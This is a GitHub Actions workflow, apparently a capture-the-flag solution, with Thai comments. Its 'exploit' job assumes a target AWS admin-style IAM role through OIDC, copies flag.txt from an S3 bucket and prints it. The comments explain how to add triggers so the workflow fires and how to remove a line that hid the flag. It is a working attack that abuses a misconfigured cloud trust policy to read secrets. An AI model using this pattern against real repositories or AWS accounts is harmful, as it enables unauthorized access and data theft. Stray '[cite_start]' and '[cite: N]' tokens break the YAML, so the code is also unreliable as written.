name: Get The Flag

on:
  # เราจะใช้ Trigger เดิมของ Repo ต้นทาง (ซึ่งน่าจะเป็น pull_request_target)
  # แต่เราจะเพิ่ม push และ workflow_dispatch ไว้ด้วย เพื่อให้แน่ใจว่ามันทำงาน
  push:
    branches: [ main ]
  # **สำคัญ:** แก้ไขโค้ดนี้ให้ตรงกับ 'deploy.yml' เดิม แต่ลบ perl ออก
  # ถ้า 'deploy.yml' เดิมมี pull_request_target ให้คงไว้
  pull_request:  # <-- เพิ่มอันนี้เข้าไป (เผื่อว่าต้นฉบับไม่มี)
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Assume Target AWS Role
      uses: aws-actions/configure-aws-credentials@v4
      with:
        [cite_start]role-to-assume: "arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875" [cite: 1]
        role-session-name: Hacker-Session-${{ github.run_id }}
        [cite_start]aws-region: "ap-southeast-1" [cite: 1]

    - name: Steal and Print the Full Flag
      run: |
        [cite_start]echo "Attempting to read the secret flag from S3..." [cite: 3]
        [cite_start]aws s3 cp s3://oh-i-really-do-care/flag.txt . [cite: 1]
        [cite_start]echo "--- FLAG CONTENT ---" [cite: 4]
        # เราลบบรรทัด 'perl' ที่ซ่อน Flag ออกไปแล้ว
        [cite_start]cat flag.txt [cite: 4]
        [cite_start]echo "--- END FLAG ---" [cite: 4]
